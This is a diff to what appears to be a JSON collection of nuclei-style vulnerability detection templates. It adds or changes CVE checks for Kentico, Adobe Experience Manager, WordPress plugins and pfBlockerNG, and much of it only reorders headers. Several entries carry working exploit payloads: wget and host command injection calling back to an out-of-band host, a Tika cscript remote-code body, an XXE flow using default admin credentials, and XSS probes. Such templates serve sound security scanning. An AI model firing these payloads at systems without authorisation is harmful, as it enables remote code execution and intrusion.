@@ -5734,6 +5734,21 @@
       ]
     },
     {
+      "id": "CVE-2017-17736",
+      "info": {
+        "name": "Kentico - Unauthenticated Administration Dashboard",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/CMSInstall/install.aspx"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-18024",
       "info": {
         "name": "AvantFAX 3.3.3 - Cross-Site Scripting",
@@ -6741,11 +6756,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -10220,6 +10235,21 @@
       ]
     },
     {
+      "id": "CVE-2019-8086",
+      "info": {
+        "name": "Adobe Experience Manager XXE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /content/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAuthorization: Basic YWRtaW46YWRtaW4=\nReferer: {{BaseURL}}\n\nsling:resourceType=fd/af/components/guideContainer\n",
+            "POST /content/{{randstr}}.af.internalsubmit.json HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAuthorization: Basic YWRtaW46YWRtaW4=\nReferer: {{BaseURL}}\n\nguideState={\"guideState\"%3a{\"guideDom\"%3a{},\"guideContext\"%3a{\"xsdRef\"%3a\"\",\"guidePrefillXml\"%3a\"<afData>\\u0041\\u0042\\u0043</afData>\"}}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-8442",
       "info": {
         "name": "Jira - Local File Inclusion",
@@ -12175,9 +12205,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -16947,8 +16977,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -20215,7 +20245,7 @@
       "requests": [
         {
           "raw": [
-            "GET /cgi-bin/touchlist_sync.cgi?IP=;wget+http://{{interactsh-url}}; HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET /cgi-bin/mesh.cgi?page=upgrade&key=;%27wget+http://{{interactsh-url}};%27 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -20353,6 +20383,22 @@
           "path": [
             "{{BaseURL}}/wp/wp-content/uploads/wpjobboard/",
             "{{BaseURL}}/wp-content/uploads/wpjobboard/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2546",
+      "info": {
+        "name": "All-in-One WP Migration plugin - Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/admin.php?page=ai1wm_export HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-admin/admin-ajax.php?action=ai1wm_export&ai1wm_import=1&options%5Breplace%5D%5Bnew_value%5D%5B%5D=XSSPAYLOAD%3Csvg+onload=alert(document.domain)%3E&ai1wm_manual_export=1&secret_key={{secretkey}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -21074,6 +21120,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31814",
+      "info": {
+        "name": "PfSense Pfblockerng Plugin - Remote Code execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /pfblockerng/www/index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\n",
+            "GET /pfblockerng/www/index.php HTTP/1.1\nHost: ' *; host {{interactsh-url}}; '\nAccept: */*\n\n"
           ]
         }
       ]
